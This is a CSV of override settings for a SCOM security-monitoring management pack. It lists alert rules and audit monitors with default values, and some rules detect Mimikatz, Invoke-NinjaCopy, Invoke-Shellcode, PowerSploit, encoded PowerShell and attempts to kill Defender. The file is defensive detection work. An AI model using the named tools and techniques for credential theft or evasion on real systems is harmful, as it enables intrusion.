ManagementPackId,WorkflowId,WorkflowType,DisplayName,Description,OverrideParameterName,OverrideParameterType,DefaultValue,Balanced,Essentials,Notes
Security.Monitoring,SecurityMonitoringMP.Event.LocalAccountCreatedonServer,Rule,Security Monitoring: Local account created on a member server,"In a normal environment, this will only happen when the system is setup. You should not see this event on production member servers at all",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.LocalAccountCreatedonServer,Rule,Security Monitoring: Local account created on a member server,"In a normal environment, this will only happen when the system is setup. You should not see this event on production member servers at all",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.LocalAccountCreatedonServer,Rule,Security Monitoring: Local account created on a member server,"In a normal environment, this will only happen when the system is setup. You should not see this event on production member servers at all",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeMimikatzInUse,Rule,Security Monitoring:  Invoke-Mimikatz is in Use.,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeMimikatzInUse,Rule,Security Monitoring:  Invoke-Mimikatz is in Use.,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeMimikatzInUse,Rule,Security Monitoring:  Invoke-Mimikatz is in Use.,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareInstallOnServer,Rule,Security Monitoring:  Software was Installed on a Server,"This rule look sfor 11707 events in the application log and alerts accordingly.  Note that patches will likely be flagged with this rule, so it should be turned on if there is a good maintenance process in place",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareInstallOnServer,Rule,Security Monitoring:  Software was Installed on a Server,"This rule look sfor 11707 events in the application log and alerts accordingly.  Note that patches will likely be flagged with this rule, so it should be turned on if there is a good maintenance process in place",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareInstallOnServer,Rule,Security Monitoring:  Software was Installed on a Server,"This rule look sfor 11707 events in the application log and alerts accordingly.  Note that patches will likely be flagged with this rule, so it should be turned on if there is a good maintenance process in place",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,AGPMDomain,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,AGPMAccount,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.ProhibitedApp,Rule,Security Monitoring:  Prohibited App in Use,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.ProhibitedApp,Rule,Security Monitoring:  Prohibited App in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.ProhibitedApp,Rule,Security Monitoring:  Prohibited App in Use,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.CollectLegacyTLSEvents,Rule,Security Monitoring: Collect Legacy TLS Events,This collection rule will collect events created from TLS 1.0 or TLS 1.1. Run the associated report to see where this is happening in your environment.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.CollectLegacyTLSEvents,Rule,Security Monitoring: Collect Legacy TLS Events,This collection rule will collect events created from TLS 1.0 or TLS 1.1. Run the associated report to see where this is happening in your environment.,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.KillWindowsDefender,Rule,Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.KillWindowsDefender,Rule,Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.KillWindowsDefender,Rule,Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,AGPMAccount,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,AGPMDomain,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeNinjaCopy,Rule,Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeNinjaCopy,Rule,Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeNinjaCopy,Rule,Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Count,int,5,5,5,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,IntervalSeconds,int,300,300,300,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,IPExlusionRegEx,string,,,,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoring.Event.FailedLogin,Rule,Security Monitoring: Failed RDP Logon,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemRestarted,Rule,Security Monitoring:  A system was restarted,"This is not necessarily a security event, and as such this is disabled by default, but it can be useful in tracking security events or bad business practice.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemRestarted,Rule,Security Monitoring:  A system was restarted,"This is not necessarily a security event, and as such this is disabled by default, but it can be useful in tracking security events or bad business practice.",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemRestarted,Rule,Security Monitoring:  A system was restarted,"This is not necessarily a security event, and as such this is disabled by default, but it can be useful in tracking security events or bad business practice.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.SpecialGroupLogon,Rule,Security Monitoring Collection:  Event ID 4694,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.SpecialGroupLogon,Rule,Security Monitoring Collection:  Event ID 4694,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.CredentialSwap,Rule,Security Monitoring Forwarded Events:  Potential Credential Swap in Progress,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.CredentialSwap,Rule,Security Monitoring Forwarded Events:  Potential Credential Swap in Progress,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.CredentialSwap,Rule,Security Monitoring Forwarded Events:  Potential Credential Swap in Progress,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetDLLLoadPath,Rule,Security Monitoring:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetDLLLoadPath,Rule,Security Monitoring:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetDLLLoadPath,Rule,Security Monitoring:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.InvokeEncodedCommand,Rule,Security Monitoring:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.4672,Rule,Security Monitoring Collection:  Event ID 4672,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.4672,Rule,Security Monitoring Collection:  Event ID 4672,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App3,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App1,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App4,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App5,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,App2,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ScheduledTaskCreatedOnServer,Rule,Security Monitoring: A Scheduled Task Was Created On Server,A scheduled task was created on this server.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.CollectLAPSEvents,Rule,Security Monitoring Forwarded Events: Collect LAPS Events,Description for the new event collection rule.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.CollectLAPSEvents,Rule,Security Monitoring Forwarded Events: Collect LAPS Events,Description for the new event collection rule.,AllowProxying,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPoweredOff,Rule,Security Monitoring:  A system has been powered off,"This is not necessarily a security event, and as such it can generate noise and is off by default.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPoweredOff,Rule,Security Monitoring:  A system has been powered off,"This is not necessarily a security event, and as such it can generate noise and is off by default.",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPoweredOff,Rule,Security Monitoring:  A system has been powered off,"This is not necessarily a security event, and as such it can generate noise and is off by default.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode is in Use,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode is in Use,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode is in Use,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare,Rule,Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare,Rule,Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare,Rule,Security Monitoring Forwarded Events:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousReg,Rule,Security Monitoring:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousReg,Rule,Security Monitoring:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousReg,Rule,Security Monitoring:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoring.Failed.Login.Attempts.Collection,Rule,Collect Failed Login Attemts,Failed Login Attempts,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoring.Failed.Login.Attempts.Collection,Rule,Collect Failed Login Attemts,Failed Login Attempts,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.IncludeCommandLineProcessCreationonMS,UnitMonitor,Security Monitoring: Include Command Line for Process Auditing Setting on Member Servers,This monitor will look at the registry key that needs to be set to include command line in 4688 events,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.UserAccountMgmtMS,UnitMonitor,Security Monitoring: User Account Management Audit Setting not Set on Member Servers,"Monitors ""Security Group Management"" auditing setting",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.UserAccountMgmtMS,UnitMonitor,Security Monitoring: User Account Management Audit Setting not Set on Member Servers,"Monitors ""Security Group Management"" auditing setting",SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.UserAccountMgmtMS,UnitMonitor,Security Monitoring: User Account Management Audit Setting not Set on Member Servers,"Monitors ""Security Group Management"" auditing setting",IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC,UnitMonitor,Security Monitoring:  Domain Controller Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC,UnitMonitor,Security Monitoring:  Domain Controller Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC,UnitMonitor,Security Monitoring:  Domain Controller Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.ProcessCreationMemberServer,UnitMonitor,Security Monitoring: Process Creation Setting for Member Servers,Description for the new unit monitor.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.ProcessCreationMemberServer,UnitMonitor,Security Monitoring: Process Creation Setting for Member Servers,Description for the new unit monitor.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.ProcessCreationMemberServer,UnitMonitor,Security Monitoring: Process Creation Setting for Member Servers,Description for the new unit monitor.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.DirectoryServiceChangeAuditing,UnitMonitor,Security Monitoring: Directory Service Change Monitoring not Set on DCs,Monitors directory service change auditing setting,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DirectoryServiceChangeAuditing,UnitMonitor,Security Monitoring: Directory Service Change Monitoring not Set on DCs,Monitors directory service change auditing setting,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.DirectoryServiceChangeAuditing,UnitMonitor,Security Monitoring: Directory Service Change Monitoring not Set on DCs,Monitors directory service change auditing setting,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.SecurityAudit.ProcessCreationDC,UnitMonitor,Security Monitoring: Audit Process Creation Set on DC,"This Monitor is for Security Monitoring configuration settings only. It will not generate alerts, but the state view will show you where your gaps are in monitoring. This will monitor the Audit Process Creation setting on Domain Controllers.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SecurityAudit.ProcessCreationDC,UnitMonitor,Security Monitoring: Audit Process Creation Set on DC,"This Monitor is for Security Monitoring configuration settings only. It will not generate alerts, but the state view will show you where your gaps are in monitoring. This will monitor the Audit Process Creation setting on Domain Controllers.",SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SecurityAudit.ProcessCreationDC,UnitMonitor,Security Monitoring: Audit Process Creation Set on DC,"This Monitor is for Security Monitoring configuration settings only. It will not generate alerts, but the state view will show you where your gaps are in monitoring. This will monitor the Audit Process Creation setting on Domain Controllers.",IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.SGManagementDC,UnitMonitor,Security Monitoring: Security Group Management Audit not Set on DCs,Monitors Account Management > Security Group Management for Domain Controllers,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SGManagementDC,UnitMonitor,Security Monitoring: Security Group Management Audit not Set on DCs,Monitors Account Management > Security Group Management for Domain Controllers,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SGManagementDC,UnitMonitor,Security Monitoring: Security Group Management Audit not Set on DCs,Monitors Account Management > Security Group Management for Domain Controllers,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,RegValue,string,msv1_0,msv1_0,msv1_0,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,IntervalSeconds,int,300,300,300,
Security.Monitoring,Security.Monitoring.Monitors.AuthenticationPackages,UnitMonitor,Security Monitoring: Check Authentication Packages Registry Key,Description for the new unit monitor.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers,UnitMonitor,Security Monitoring:  Member Server Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers,UnitMonitor,Security Monitoring:  Member Server Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers,UnitMonitor,Security Monitoring:  Member Server Special Group Logon,This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.AuditAccountLogonMS,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on Member Servers,Monitors Logon auditing setting on Member Servers.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.AuditAccountLogonMS,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on Member Servers,Monitors Logon auditing setting on Member Servers.,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.AuditAccountLogonMS,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on Member Servers,Monitors Logon auditing setting on Member Servers.,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,SecurityMonitoringMP.WDigestRegConfiguredMonitor,UnitMonitor,Security Monitoring:  Wdigest passwords stored in clear text,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.AuditAccountLogonDC,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on DCs,Monitors Logon auditing setting,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.AuditAccountLogonDC,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on DCs,Monitors Logon auditing setting,SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.AuditAccountLogonDC,UnitMonitor,Security Monitoring: Account Logon Monitoring not Set on DCs,Monitors Logon auditing setting,IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,SecurityMonitoringMP.UseLogonCredentialExistsMonitor,UnitMonitor,Security Monitoring: UseLogonCredential key does not exist,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemPendingRestart,UnitMonitor,A System - Is Pending Restart,A system has been identified as requiring a system restart. Not all features / functions will be available until after the restart has completed.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Health.EventCollectorMonitor,UnitMonitor,Security Monitoring:  Event Log Collector Service is stopped,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Health.EventCollectorMonitor,UnitMonitor,Security Monitoring:  Event Log Collector Service is stopped,,CheckStartupType,string,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.IncludeCommandLineProcessCreationonDCs,UnitMonitor,Security Monitoring: Include Command Line for Process Auditing Setting on DCs,This monitor will look at the registry key that needs to be set to include command line in 4688 events,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.RepeatedLogonMonitor,UnitMonitor,Security Monitoring:  Repeated RDP Logon Failures,,Enabled,bool,TRUE,TRUE,TRUE,
